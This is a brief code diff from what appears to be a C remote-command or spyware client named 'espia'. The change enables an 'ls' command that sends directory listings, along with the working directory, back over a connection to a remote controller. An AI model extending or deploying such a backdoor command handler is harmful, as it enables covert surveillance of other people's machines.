@@ -47,7 +47,7 @@ int main() {
             pwd(pwd_buff, sizeof(pwd_buff));
             espia_send(pwd_buff, sizeof(pwd_buff));
         } else if (strcmp(recv_buff, "ls") == 0) {
-            //ls(&connection);
+            ls(espia_send);
         } else {
             printf("%s\n", recv_buff);
         }
